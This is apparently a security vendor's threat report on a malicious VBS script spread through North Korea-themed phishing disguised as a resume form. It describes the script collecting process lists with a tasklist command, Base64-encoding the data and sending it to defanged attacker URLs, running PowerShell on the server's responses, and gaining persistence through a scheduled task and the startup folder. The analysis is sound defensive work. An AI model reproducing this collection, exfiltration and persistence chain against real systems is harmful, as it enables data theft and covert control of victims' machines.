March 29, 2022

The ASEC analysis team recently confirmed that malicious VBS for the purpose of
information leakage is being distributed through phishing emails related to North Korea. It
contains the contents of a broadcast related to North Korea, and a compressed file is
attached. Referring to writing a resume, induce execution of the attached file. A malicious
VBS script file exists inside the compressed file.

The brief behavior of the '2022 resume form.vbs' file is as follows.
Information Collection and Transmission
Generating a normal Korean file
Creating additional malicious script files and registering the task scheduler
When the VBS file is executed, information of the user's PC is collected through the following
command.
Information Collected

List of currently running
processes

cmd /c tasklist /v | clip

After encoding the collected information in Base64, it is transmitted to
hxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php.

Also, in order to disguise as a normal file, the Korean file created with the '2022.hwp'
command is executed in the folder where the '2022 resume form.vbs' file is executed. The
Korean file contains the contents of the resume format as follows.

After that, the data present in the response received from the URL that transmitted the
information is executed using PowerShell. Also, the %appdata%\mscornet.vbs file created
through the corresponding response is registered in the task scheduler as the Google Update
Source Link name. In addition to this, copy mscornet.vbs to the startup program folder so
that the VBS file can be executed automatically, and then self-delete the '2022 resume
form.vbs' file.

Currently, no special response is received from
hxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php, which sent the
information, but the received response recorded in RAPIT, our automatic analysis system
(confirmed on 3/26) ) contains additional commands.
In the response message, use PowerShell to save base64-encoded data in
%AppData%\~KB3241.tmp. After that, ~KB3241.tmp is decoded and saved as
%AppData%\mscornet.vbs, and then ~KB3241.tmp is deleted.

mscornet.vbs connects to
hxxp://cmaildowninvoice.webcindario[.]com/contri/sqlite/msgbugGlog.php?
Cache=fail&Sand=[PC name] and executes the received response with the Execute
command. Currently, additional commands are not identified in the URL, but various
malicious actions can be performed by an attacker.
Recently, malicious codes disguised as North Korea-related contents are being distributed in
the form of VBS scripts as well as word documents, so user attention is required.
